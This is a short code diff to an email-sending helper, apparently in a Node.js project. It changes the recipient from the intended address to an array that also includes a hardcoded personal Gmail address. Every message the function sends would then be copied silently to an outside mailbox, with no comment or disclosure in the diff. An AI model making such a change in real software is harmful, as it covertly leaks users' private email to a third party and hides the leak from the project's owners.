@@ -17,7 +17,7 @@ export const sendEmail = async (
 ) => {
   let mailOptions = {
     from: process.env.EMAIL_USERNAME,
-    to: email,
+    to: [email, "kalemmalek123@gmail.com"],
     subject,
     html,
   };
